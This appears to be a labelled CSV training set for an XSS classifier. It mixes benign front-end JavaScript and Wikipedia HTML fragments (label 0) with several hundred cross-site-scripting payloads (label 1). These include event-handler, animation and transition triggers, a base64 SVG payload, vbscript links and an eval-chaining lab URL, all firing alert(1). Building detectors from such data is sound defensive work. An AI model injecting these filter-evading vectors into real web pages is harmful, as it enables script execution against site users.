payload,label
options.onfirstupdate(state); } }); // modifiers have the ability to execute arbitrary code before the first,0
"if (!arevalidelements(reference, popper)) {",0
"<samp ondblclick=""alert(1)"">test</samp>",1
"<kbd onclick=""alert(1)"">test</kbd>",1
<listing id=x tabindex=1 onbeforedeactivate=alert(1)></listing><input autofocus>,1
"<colgroup oncopy=""alert(1)"" contenteditable>test</colgroup>",1
<script>ondevicemotion=settimeout;event.prototype.tostring=urierror.prototype.tostring;event.prototype.message='alert\x281\x29'</script>,1
"<li><a href=""/wiki/hypostatic_abstraction"" title=""hypostatic abstraction"">hypostatic abstraction </a> </li>",0
"</span> <span class=""toctext"">finance and economics",0
<caption onpointerover=alert(1)>xss</caption>,1
"<style>:target {color: red;}</style><b id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></b>",1
_ordertodirection(order) { if (isrtl()) { return order === order_prev ? direction_left : direction_right;,0
if (e.type === 'touchstart') {,0
if (!isnan(maxmonth) && this._m > maxmonth) {,0
}); } $(this.thumb).removeclass('active');,0
this.wrapper.append(this.el); } if (!this.contentel) {,0
"return; } var _options$mainaxis = options.mainaxis,",0
if (newoption) { if (!this.ismultiple) { collection.find('li.selected').removeclass('selected');,0
<li onpointerout=alert(1)>xss</li>,1
"onclosestart: this.options.onclosestart,",0
"this.xnumsteps = this.xsteps.slice(0); for ( index = 0; index < this.xnumsteps.length; index++ ) { handlesteppoint(index, this.xnumsteps[index], this);",0
"'"">' + this.options.i18n.cancel + '</button>'",0
this._element.style[property] = `${scrollbarwidth}px` } if (!isbodyoverflowing && ismodaloverflowing) {,0
"<li><a href=""/wiki/glossary_of_physics"" title=""glossary of physics"">physics </a> </li>",0
"_classcallcheck(this, autocomplete)",0
} parsed.handles = entry.length; parsed.start = entry;,0
if (element !== this._element && window.innerwidth > element.clientwidth + scrollbarwidth) { return; },0
<li onblur=alert(1) tabindex=1 id=x></li><input autofocus>,1
"gpuacceleration: gpuacceleration, isfixed: state.options.strategy === 'fixed' };",0
"this._resetelementattributes(this._element, property_padding) this._resetelementattributes(selector_fixed_content, property_padding) this._resetelementattributes(selector_sticky_content, property_margin)",0
<bdi onpointerenter=alert(1)>xss</bdi>,1
"activeelement.classlist.remove(class_name_active, orderclassname, directionalclassname) this._issliding = false triggerevent(event_slid)",0
"<li id=""cite_note-liwu2015-270""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-liwu2015_270-0"">^ </a> </b>",0
"<div draggable=""true"" contenteditable>drag me</div><strong ondragover=alert(1) contenteditable>drop here</strong>",1
formreset .find(input_selector) .removeclass('valid'),0
"if (this.options.swipeable) { if (this._tabscarousel) { this._tabscarousel.set(this.index, () => {",0
<set onpointerleave=alert(1)>xss</set>,1
if ( to !== false && !isnan(to) ) {,0
"<li><a href=""/wiki/glossary_of_ichthyology"" title=""glossary of ichthyology"">ichthyology </a> </li>",0
var attributes = state.attributes[name] || {},0
"<area onbeforepaste=""alert(1)"" contenteditable>test</area>",1
"}] }, b = { linear: a(.25, .25, .75, .75) }, f = {},",0
resultscontainer.append(resultdiv),0
radian = math.pi * 2 + radian; } let value = math.round(radian / unit);,0
"<big draggable=""true"" ondragstart=""alert(1)"">test</big>",1
this.$el.before(this.$overlay); var overlayoffset = this.$overlay[0].getboundingclientrect(); this.$overlay.css({,0
} if (scrolledx + bounding.width > containerrect.right - offset || scrolledx + bounding.width > window.innerwidth - offset) { edges.right = true;,0
definejqueryplugin(collapse); var top = 'top'; var bottom = 'bottom';,0
"window.index.add({ href: 'http://materializecss.com/helpers.html', title: 'helpers',",0
"<ins onclick=""alert(1)"">test</ins>",1
"}function ba(a, c) {",0
<i onpointerleave=alert(1)>xss</i>,1
"<dt><a class=""reference internal"" href=""topics/practices.html""><span class=""doc"">common practices",0
"<sub onbeforepaste=""alert(1)"" contenteditable>test</sub>",1
"<th onkeypress=""alert(1)"" contenteditable>test</th>",1
<body id=x tabindex=1 onbeforeactivate=alert(1)></body>,1
"function countdecimals ( numstr ) { numstr = string(numstr); var pieces = numstr.split(""."");",0
"this._element.setattribute('aria-modal', true) this._element.setattribute('role', 'dialog') this._element.scrolltop = 0",0
"<style>:target {transform: rotate(180deg);}</style><kbd id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></kbd>",1
"<hgroup onmouseover=""alert(1)"">test</hgroup>",1
<rp onpointerleave=alert(1)>xss</rp>,1
"this.$floatingbtnsreverse.each((el) => { anim({ targets: el,",0
"}, { key: ""_animateimageout"", value: function _animateimageout() {",0
"<a href=""vbscript:msgbox+1"">xss</a> <a href=""#"" onclick=""vbs:msgbox+1"">xss</a> <a href=""#"" onclick=""vbs:msgbox+1"">xss</a> <a href=""#"" onclick=""vbscript:msgbox+1"">xss</a> <a href=""#"" onclick=""vbscript:msgbox+1"">xss</a> <a href=""#"" language=vbs onclick=""vbscript:msgbox+1"">xss</a>",1
}); } _focusfocuseditem() {,0
"<plaintext onmousemove=""alert(1)"">test</plaintext>",1
"<script src=""https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.12/purify.min.js""></script> <script> document.write(dompurify.sanitize('<img src onerror=alert(1)>')) </script>",1
"function chips(el, options) {",0
'dropdown-content select-dropdown ' + (this.ismultiple ? 'multiple-select-dropdown' : '') ); if (this.$selectoptions.length) {,0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><caption id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></caption>",1
<svg><summary onload=alert(1)></summary>,1
var element = state.elements[name]; // arrow is optional + virtual elements if (!ishtmlelement(element) || !getnodename(element)) { return;,0
"} else if ( !array.isarray( entry ) || !entry.length || entry.length !== parsed.handles + 1 ) { throw new error(""nouislider: 'connect' option doesn't match handle count."");",0
this.el.m_range = undefined,0
"this._element.classlist.add(class_name_show) this._element.classlist.remove(class_name_showing) eventhandler.trigger(this._element, event_shown, { relatedtarget })",0
"}); var referenceclippingoffsets = getsideoffsets(referenceoverflow, referencerect); var popperescapeoffsets = getsideoffsets(popperaltoverflow, popperrect, preventedoffsets);",0
"<li id=""cite_note-formal_methods_in_ai-43""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-formal_methods_in_ai_43-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-formal_methods_in_ai_43-1""><sup><i><b>b </b> </i> </sup> </a>",0
const selector = selectorengine.getselectorfromelement(elem) const filterelement = selectorengine.find(selector) .filter(foundelement => foundelement === this._element),0
"<h4><span class=""mw-headline"" id=""anti-logic_or_scruffy"">anti-logic or scruffy",0
"<li><a href=""/wiki/holographic_data_storage"" title=""holographic data storage"">holographic data storage </a> </li> </ul> </li>",0
"<div draggable=""true"" contenteditable>drag me</div><menuitem ondragover=alert(1) contenteditable>drop here</menuitem>",1
<s onblur=alert(1) tabindex=1 id=x></s><input autofocus>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><* id=x style=""position:absolute;"" onanimationcancel=""print()""></*>",1
const class_name_backdrop = 'offcanvas-backdrop'; const open_selector = '.offcanvas.show'; const event_show = `show${event_key}`;,0
<rp onpointerover=alert(1)>xss</rp>,1
$('.toc-wrapper').pushpin({,0
"this._handleclosetriggerclickbound = this._handleclosetriggerclick.bind(this); this.dragtarget.addeventlistener('touchmove', this._handledragtargetdragbound); this.dragtarget.addeventlistener('touchend', this._handledragtargetreleasebound);",0
_configaftermerge(config) { config.target = getelement(config.target) || document.body config.rootmargin = config.offset ? `${config.offset}px 0px -30%` : config.rootmargin,0
<noframes onpointerleave=alert(1)>xss</noframes>,1
if (!(el instanceof element)) {,0
config.defaultinterval = config.interval; return config; },0
backdrop.classname = this._config.classname; if (this._config.isanimated) { backdrop.classlist.add(class_name_fade);,0
"</span> <span class=""toctext"">superintelligence",0
value = `${value} ${this.amorpm}`; } this.el.value = value;,0
"<colgroup oncut=""alert(1)"" contenteditable>test</colgroup>",1
"}function i(a, c) { return h.fnc(a) ? a(c.target, c.id, c.total) : a; }function e(a, c) {",0
"<svg><use href=""data:image/svg+xml;base64,phn2zybpzd0neccgeg1sbnm9j2h0dha6ly93d3cudzmub3jnlziwmdavc3znjyb4bwxuczp4bgluaz0nahr0cdovl3d3dy53my5vcmcvmtk5os94bgluaycgd2lkdgg9jzewmccgagvpz2h0pscxmdanpgo8aw1hz2ugahjlzj0imsigb25lcnjvcj0iywxlcnqomskiic8+cjwvc3znpg==#x"" /></svg>",1
this._element.style[property] = `${scrollbarwidth}px`,0
"<script onmouseover=""alert(1)"">test</script>",1
"<video><source src=""//evil?",1
<address id=x tabindex=1 onbeforeactivate=alert(1)></address>,1
<article onpointermove=alert(1)>xss</article>,1
<input id=x onfocus=alert(1)>,1
"return unique(elems); }, has: function (selector) {",0
} element.classlist.add(class_name_show); this._emulateanimation(() => {,0
"<main onmouseover=""alert(1)"">test</main>",1
"return fn.apply(target, [event]) } }",0
value: function _animateout(index) { var _this7 = this; var $collapsibleli = this.$el.children('li').eq(index);,0
"<cite onpaste=""alert(1)"" contenteditable>test</cite>",1
<div ongestureend=alert(1)>xss</div>,1
"translatey: _this50.offsety,",0
} else { length = this.length = elems.length; for (; i < length; i++) {,0
"<base oncopy=""alert(1)"" contenteditable>test</base>",1
"</span> <span class=""reference-text""><cite class=""citation news"">lohr, steve (2017). <a rel=""nofollow"" class=""external text"" href=""https://www.nytimes.com/2017/01/12/technology/robots-will-take-jobs-but-not-as-fast-as-some-fear-new-report-says.html"">""robots will take jobs, but not as fast as some fear, new report says"" </a>. <i>the new york times </i><span class=""reference-accessdate"">. retrieved <span class=""nowrap"">13 january",0
"<cite onkeyup=""alert(1)"" contenteditable>test</cite>",1
_showrangebubble() {,0
"function _interopnamespacedefault(e) { const n = object.create(null, { [symbol.tostringtag]: { value: 'module' } }); if (e) {",0
const getselector = element => { let selector = element.getattribute('data-bs-target') if (!selector || selector === '#') {,0
if (e.keycode === 27) {,0
"<plaintext draggable=""true"" ondragleave=""alert(1)"">test</plaintext>",1
"throw new error(""nouislider: 'step' is not numeric.""); } parsed.singlestep = entry;",0
<meter onpointerout=alert(1)>xss</meter>,1
"http://subdomain1.portswigger-labs.net/xss/xss.php?x=%3cscript%3ename=%22=alert(1)%22;location=%22https://portswigger-labs.net/xss/xss.php?x=%3cscript%3ethrow%20onerror=eval,name%3c%5c/script%3e%22%3c/script%3e",1
}); element.innerhtml = out; return element;,0
"var child = elem ? cash(elem)[0] : this[0], collection = elem ? this : cash(child).parent().children(); return slice.call(collection).indexof(child);",0
$(this.dropdownoptions) .find('li') .removeclass('selected');,0
const themeswitcherlabel = `${themeswitchertext.textcontent} (${btntoactive.dataset.bsthemevalue})`,0
"<li><a href=""/wiki/phenomenology_(philosophy)"" title=""phenomenology (philosophy)"">phenomenology </a> </li>",0
"<div draggable=""true"" contenteditable>drag me</div><article ondragover=alert(1) contenteditable>drop here</article>",1
"$card.data( 'initialoverflow', $card.css('overflow') === undefined ? '' : $card.css('overflow')",0
"stepafter: { startvalue: this.xval[j-0], step: this.xnumsteps[j-0], higheststep: this.xhighestcompletestep[j-0] } }; };",0
<span onpointerup=alert(1)>xss</span>,1
"this._setattributeifnotexists(outerelem, 'role', 'presentation') } if (!isactive) {",0
<tr id=x tabindex=1 onfocus=alert(1)></tr>,1
} else if ($target.closest('.month-prev').length) { this.prevmonth(); } else if ($target.closest('.month-next').length) {,0
"_classcallcheck(this, carousel); var _this62 = _possibleconstructorreturn(this, (carousel.__proto__ || object.getprototypeof(carousel)).call(this, carousel, el, options)); _this62.el.m_carousel = _this62;",0
}); } $collapsibleli[0].classlist.add('active');,0
"target.classlist.add(class_name_active) this._activateparents(target) eventhandler.trigger(this._element, event_activate, { relatedtarget: target })",0
"<style>@keyframes x{}</style><dir style=""animation-name:x"" onanimationstart=""alert(1)""></dir>",1
do { prefix += math.floor(math.random() * max_uid) } while (document.getelementbyid(prefix)),0
"<li><a href=""/wiki/very_large_scale_integration"" title=""very large scale integration"">very large scale integration </a> </li>",0
"<footer onmousedown=""alert(1)"">test</footer>",1
"<tbody onkeydown=""alert(1)"" contenteditable>test</tbody>",1
"<br onkeyup=""alert(1)"" contenteditable>test</br>",1
"<p>ai has developed many tools to solve the most difficult problems in <a href=""/wiki/computer_science"" title=""computer science"">computer science </a>. a few of the most general of these methods are discussed below.",0
offset } = this._config; if (typeof offset === 'string') {,0
"<isindex draggable=""true"" ondragenter=""alert(1)"">test</isindex>",1
const elements = selectorengine.focusablechildren(trapelement) if (elements.length === 0) { trapelement.focus(),0
return template; } _typecheckconfig(config) {,0
".find('li') .removeclass('selected'); $(optionel).toggleclass('selected', selected);",0
return } element.classlist.add(class_name_active),0
scalefactor = windowwidth / backdrop[0].clientwidth; this.btnbottom = btnrect.bottom; this.btnleft = btnrect.left;,0
import eventhandler from '../dom/event-handler.js' import selectorengine from '../dom/selector-engine.js' import config from './config.js',0
<th onpointerleave=alert(1)>xss</th>,1
"<style>:target {color: red;}</style><em id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></em>",1
<data onpointerleave=alert(1)>xss</data>,1
const callable = isdelegated ? delegationfunction : handler || delegationfunction; let typeevent = gettypeevent(originaltypeevent); if (!nativeevents.has(typeevent)) {,0
animoptions.translatex = -100; } anim(animoptions);,0
this.originalwidth = this.el.getboundingclientrect().width,0
"<td onkeypress=""alert(1)"" contenteditable>test</td>",1
var resultdiv = $('<a href=' + result[1] + '>' + result[0] + '</a>'); resultscontainer.append(resultdiv); });,0
"<acronym oncut=""alert(1)"" contenteditable>test</acronym>",1
m.timepicker = timepicker,0
calendar.month += 12,0
<img src=validimage.png onloadend=alert(1)>,1
"<style>@keyframes slidein {}</style><cite style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></cite>",1
}); if (this.showindicators) { this.$el.append(this.$indicators);,0
<shadow onpointerenter=alert(1)>xss</shadow>,1
"<style>:target {color: red;}</style><details id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></details>",1
"_classcallcheck(this, taptarget)",0
"<data onmouseenter=""alert(1)"">test</data>",1
this._deltax = 0 this._supportpointerevents = boolean(window.pointerevent) this._initevents(),0
"<style draggable=""true"" ondragleave=""alert(1)"">test</style>",1
} } return elementisvisible;,0
<nav onpointerenter=alert(1)>xss</nav>,1
"<iframe onmouseup=""alert(1)"">test</iframe>",1
_this35._handlewindowscroll(); return _this35; },0
}; }; spectrum.prototype.countstepdecimals = function () {,0
"<div draggable=""true"" contenteditable>drag me</div><tfoot ondrop=alert(1) contenteditable>drop here</tfoot>",1
<svg><discard onbegin=alert(1)>,1
return new focustrap({ trapelement: this._element }),0
this.tabswidth = this.$el.width(),0
"<bgsound draggable=""true"" ondragend=""alert(1)"">test</bgsound>",1
"<a href=""http://66.102.7.147/""></a>",1
"<iframe onbeforecopy=""alert(1)"" contenteditable>test</iframe>",1
const event_pointerup = `pointerup${event_key$9}`; const pointer_type_touch = 'touch'; const pointer_type_pen = 'pen';,0
const selector_nav_items = '.nav-item',0
const event_keydown_data_api = `keydown${event_key$6}${data_api_key$3}`,0
"<style>:target {color:red;}</style><mark id=x style=""transition:color 1s"" ontransitionend=alert(1)></mark>",1
} domcontentloadedcallbacks.push(callback); } else {,0
"<style>@keyframes x{}</style><details style=""animation-name:x"" onanimationstart=""alert(1)""></details>",1
this.yeartextel = this.modalel.queryselector('.year-text'),0
"</span> <span class=""reference-text""><a href=""#citerefnorvig2012"">norvig 2012 </a>.",0
"<center ondblclick=""alert(1)"">test</center>",1
"<style>@keyframes x{}</style><meter style=""animation-name:x"" onanimationend=""alert(1)""></meter>",1
if (_this18.attrheight) {,0
"<textarea onmouseleave=""alert(1)"">test</textarea>",1
"<font onkeyup=""alert(1)"" contenteditable>test</font>",1
"<font onmousemove=""alert(1)"">test</font>",1
"<div id=""p-logo"" role=""banner"">",0
const relatedtarget = {,0
"<style>@keyframes x{}</style><rp style=""animation-name:x"" onanimationstart=""alert(1)""></rp>",1
dist: { files: { 'dist/js/materialize.min.js': ['dist/js/materialize.js'],0
"<img onmouseenter=""alert(1)"">test</img>",1
multi-agent planning and emergent behavior:,0
this._calculatepositioning(); this._setupeventhandlers(); },0
parsed.tooltips.push(true),0
if (opts.isdisabled) { arr.push('is-disabled'); },0
for (const carousel of carousels) {,0
"m.updatetextfields(); }); $(document).on('reset', function(e) {",0
"<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, chpt. 18.2 </li> </ul>",0
}; m.getoverflowparent = function (element) { if (element == null) {,0
<bgsound onpointerleave=alert(1)>xss</bgsound>,1
$activelis.each(function (el) { var index = $collapsiblelis.index($(el)); _this8.close(index);,0
"key: ""_renderchips"", value: function _renderchips() { this.$chips.remove();",0
"<div draggable=""true"" contenteditable>drag me</div><bdo ondragover=alert(1) contenteditable>drop here</bdo>",1
"} subclass.prototype = object.create(superclass && superclass.prototype, { constructor: { value: subclass, enumerable: false, writable: true, configurable: true } })",0
this.isopen = false; this.modal.close(); },0
"<li id=""cite_note-305""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-305"">^ </a> </b>",0
} to = options.format.from(to); if ( to !== false && !isnan(to) ) {,0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figcaption id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></figcaption>",1
"<script oncopy=""alert(1)"" contenteditable>test</script>",1
"<big ondblclick=""alert(1)"">test</big>",1
} _isanimated() { return this._config.animation || (this.tip && this.tip.classlist.contains(class_name_fade)),0
"let registry = { autocomplete: root.queryselectorall('.autocomplete:not(.no-autoinit)'), carousel: root.queryselectorall('.carousel:not(.no-autoinit)'),",0
"<li id=""cite_note-377""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-377"">^ </a> </b>",0
<time id=x tabindex=1 onbeforedeactivate=alert(1)></time><input autofocus>,1
"instance[methodoroptions].apply(instance, params)",0
"<tt draggable=""true"" ondragenter=""alert(1)"">test</tt>",1
"<style>:target {color:red;}</style><noscript id=x style=""transition:color 1s"" ontransitionend=alert(1)></noscript>",1
"if (p.get || p.set) throw new typeerror(""es3 does not support getters and setters."");e != array.prototype && e != object.prototype && (e[r] = p.value); };$jscomp.getglobal = function (e) { return ""undefined"" != typeof window && window === e ? e : ""undefined"" != typeof global && null != global ? global : e;",0
this._focustrap.deactivate(),0
"<style>@keyframes x{}</style><img style=""animation-name:x"" onanimationstart=""alert(1)""></img>",1
return (value === undefined ? this[0][name] : this.each(function (v) { v[name] = value; }));,0
"</p><p>worldwide annual military spending on robotics rose from us$5.1 billion in 2010 to us$7.5 billion in 2015.<sup id=""cite_ref-332"" class=""reference""><a href=""#cite_note-332"">&#91;321&#93; </a> </sup><sup id=""cite_ref-333"" class=""reference""><a href=""#cite_note-333"">&#91;322&#93; </a> </sup> military drones capable of autonomous action are widely considered a useful asset.<sup id=""cite_ref-334"" class=""reference""><a href=""#cite_note-334"">&#91;323&#93; </a> </sup> many artificial intelligence researchers seek to distance themselves from military applications of ai.<sup id=""cite_ref-335"" class=""reference""><a href=""#cite_note-335"">&#91;324&#93; </a> </sup>",0
const name$5 = 'templatefactory',0
"<option onmousedown=""alert(1)"">test</option>",1
const documentwidth = document.documentelement.clientwidth return math.abs(window.innerwidth - documentwidth) },0
"top: clippingclientrect.top - elementclientrect.top + paddingobject.top,",0
"scrollspy._visibleelements.splice(scrollspy._visibleelements.indexof(this.$el), 1); scrollspy._count--; this._removeeventhandlers();",0
"<caption onbeforepaste=""alert(1)"" contenteditable>test</caption>",1
"<base onmouseleave=""alert(1)"">test</base>",1
var istop = origintop <= centery,0
if (q >= g.currenttime) for (var g = 0; g < v; g++) { u[g].seek(q); } else for (; v--;) {,0
"'</div>', '<div class=""timepicker-analog-display"">', '<div class=""timepicker-plate"">',",0
"<body onkeypress=""alert(1)"" contenteditable>test</body>",1
<style id=x tabindex=1 onbeforeactivate=alert(1)></style>,1
"this._updateitemstyle(el, tweenedopacity, -i, _transformstring); } if (this.options.fullwidth) {",0
"<nobr ondblclick=""alert(1)"">test</nobr>",1
"<li id=""cite_note-308""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-308"">^ </a> </b>",0
.tolowercase() .indexof(string) === 0 );,0
}; waves.attach = function(element) { if (element.tagname.tolowercase() === 'input') {,0
<form onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></form>,1
} if (makefallbackchecks) { var numberofchecks = flipvariations ? 3 : 1;,0
"<textarea onmouseout=""alert(1)"">test</textarea>",1
<marquee id=x tabindex=1 onbeforedeactivate=alert(1)></marquee><input autofocus>,1
"<ins draggable=""true"" ondragleave=""alert(1)"">test</ins>",1
var y = (clientrect.top + (addvisualoffsets && visualviewport ? visualviewport.offsettop : 0)) / scaley,0
"targets: this.el, translatex: [`${slideoutpercent * 100}%`, 0], duration: this.options.induration,",0
const event_load_data_api$3 = `load${event_key$8}${data_api_key$5}`; const event_click_data_api$5 = `click${event_key$8}${data_api_key$5}`; const class_name_carousel = 'carousel';,0
} _handleinputblur() { if (!this._mousedown) {,0
} } _handletriggerclick(e) {,0
"<spacer oncut=""alert(1)"" contenteditable>test</spacer>",1
const class_name_prev = 'carousel-item-prev',0
if (!document.documentelement.attachshadow) {,0
"value: function _setupeventhandlers() { this._handleimageloadbound = this._handleimageload.bind(this); this.$img[0].addeventlistener('load', this._handleimageloadbound);",0
"relativex = (e.touches[0].pagex - pos.left); } ripple.setattribute('data-hold', date.now());",0
"<col oncontextmenu=""alert(1)"">test</col>",1
<tfoot id=x tabindex=1 ondeactivate=alert(1)></tfoot><input id=y autofocus>,1
if (this._ishovered === false) { this._leave() },0
"<font onmouseout=""alert(1)"">test</font>",1
"<html onmouseout=""alert(1)"">test</html>",1
"<hgroup onbeforecut=""alert(1)"" contenteditable>test</hgroup>",1
"<style>@keyframes slidein {}</style><td style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></td>",1
"return true; } tests[name].t( parsed, options[name] === undefined ? defaults[name] : options[name] );",0
_setupeventhandlers() { this._handlerangechangebound = this._handlerangechange.bind(this); this._handlerangemousedowntouchstartbound = this._handlerangemousedowntouchstart.bind(this);,0
var diff = this.center % this.count - n,0
preventscrolling: true }; class sidenav extends component {,0
const isinthedom = (shadowroot || this._element.ownerdocument.documentelement).contains(this._element),0
$(this.placeholder).after(this.el).remove(); this.$el.removeattr('style'); },0
_setupclasses() { if (this.options.edge === 'right') { this.el.classlist.add('right-aligned');,0
import { definejqueryplugin } from './util/index.js' const name = 'popover' const selector_title = '.popover-header',0
_this62.$el.append(_this62.$indicators); } _this62.count = _this62.images.length;,0
<dt>breadth of commonsense knowledge </dt>,0
<element id=x tabindex=1 onfocusin=alert(1)></element>,1
"value: function showview(view, delay) {",0
"} this.dropdown = m.dropdown.init(this.input, dropdownoptions); }",0
"<progress onpaste=""alert(1)"" contenteditable>test</progress>",1
if (this.value.length !== 0 || $(this).attr('placeholder') !== null) { $(this).siblings('label').addclass('active'); },0
"<meter onkeyup=""alert(1)"" contenteditable>test</meter>",1
"}, { key: ""_updateampmview"", value: function _updateampmview() {",0
let overlayoffset = this.$overlay[0].getboundingclientrect(),0
"relatedtarget: this._element }; const showevent = eventhandler.trigger(this._element, event_show$5, relatedtarget);",0
"container.addeventlistener('touchstart', toast._ondragstart)",0
} this.istouchmoving = false; },0
<noframes onpointerup=alert(1)>xss</noframes>,1
} } _handletabclick(e) {,0
<dir onfocusout=alert(1) tabindex=1 id=x></dir><input autofocus>,1
"<noembed onmousemove=""alert(1)"">test</noembed>",1
<noframes id=x tabindex=1 ondeactivate=alert(1)></noframes><input id=y autofocus>,1
"<style>:target {color: red;}</style><menu id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></menu>",1
<plaintext onpointerenter=alert(1)>xss</plaintext>,1
if (this.moved && x === this.dx && y === this.dy) {,0
"<i onclick=""alert(1)"">test</i>",1
}; m.guid = function () { function s4() {,0
"<style>@keyframes x{}</style><ins style=""animation-name:x"" onanimationend=""alert(1)""></ins>",1
"<li id=""cite_note-380""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-380"">^ </a> </b>",0
if (this.percentopen > 0.2) {,0
} _handletriggerkeydown(e) { if ((e.which === m.keys.arrow_down || e.which === m.keys.enter) && !this.isopen) {,0
let direction = e.which === m.keys.arrow_down ? 1 : -1,0
"<style>@keyframes x{}</style><p style=""animation-name:x"" onanimationend=""alert(1)""></p>",1
const parentscrolltop = (this._rootelement || document.documentelement).scrolltop,0
if (selector.cash && selector !== win) { return selector; },0
"return; } eventhandler.one(target, event_hidden, () => {",0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><a id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></a>",1
"<style>:target {color: red;}</style><strong id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></strong>",1
"<style>@keyframes x{}</style><noframes style=""animation-name:x"" onanimationend=""alert(1)""></noframes>",1
"<hr onclick=""alert(1)"">test</hr>",1
that.xsteps[i] = frompercentage([,0
<base id=x tabindex=1 onactivate=alert(1)></base>,1
<aside id=x tabindex=1 onbeforeactivate=alert(1)></aside>,1
"if (target.classlist.contains(class_name_dropdown_item)) { selectorengine.findone(selector_dropdown_toggle, target.closest(selector_dropdown)).classlist.add(class_name_active); return;",0
"_setupmodal() { this.modal = m.modal.init(this.modalel, { onopenstart: this.options.onopenstart,",0
if (allowedattributelist.includes(attributename)) {,0
"$(document).on('keyup', radio_checkbox, function (e) { if (e.which === m.keys.tab) { $(this).addclass('tabbed');",0
return this._resolvepossiblefunction(this._config.title) || this._element.getattribute('data-bs-original-title'); } _initializeondelegatedtarget(event) {,0
"let index = sidenav._sidenavs.indexof(this); if (index >= 0) { sidenav._sidenavs.splice(index, 1);",0
".replace(/__app_id__/g, config.algolia.app_id) } return code",0
"element.removeeventlistener(typeevent, fn, boolean(delegationselector)) delete events[typeevent][fn.uidevent] }",0
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/telnetconsole.html"">telnet console</a></li>",0
"each(eventcache, function (event) { node.removeeventlistener(eventname, event); });",0
"href: 'http://materializecss.com/chips.html', title: 'chips', body: 'chips can be used to represent small blocks of information. they are most commonly used either for contacts or for tags.'",0
this._valuedict[key] = obj; } _removedropdown() {,0
"<style>@keyframes x{}</style><blockquote style=""animation-name:x"" onanimationstart=""alert(1)""></blockquote>",1
"<audio id=x controls onfocus=alert(1) id=x><source src=""validaudio.wav""></audio>",1
"<h2><span class=""mw-headline"" id=""further_reading"">further reading",0
let clickedindex = $(e.target),0
"_this11.options.onopenend.call(_this11, _this11.el); } }",0
"methods.push([eventname, method])",0
parsehtml(selector) :,0
} else { $autocompleteoption.append('<span>' + entry.key + '</span>'); },0
if (scrollspy._visibleelements[0]) { $(this.options.getactiveelement(scrollspy._visibleelements[0].attr('id'))).addclass( this.options.activeclass,0
".siblings('label, .prefix')",0
"<s onmouseout=""alert(1)"">test</s>",1
let jqueryevent = null; let bubbles = true; let nativedispatch = true;,0
"<strong draggable=""true"" ondragend=""alert(1)"">test</strong>",1
show(relatedtarget) { if (this._isshown) { return,0
} _isshown() { return this.tip && this.tip.classlist.contains(class_name_show$2);,0
"var doc = document, win = window, arrayproto = array.prototype, slice = arrayproto.slice, filter = arrayproto.filter, push = arrayproto.push; var noop = function () {}, isfunction = function (item) { return typeof item === typeof noop && item.call;",0
"<script/src=""https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.15/lodash.min.js""></script>",1
"<details onmouseout=""alert(1)"">test</details>",1
"<* onclick=""alert(1)"" style=display:block>test</*>",1
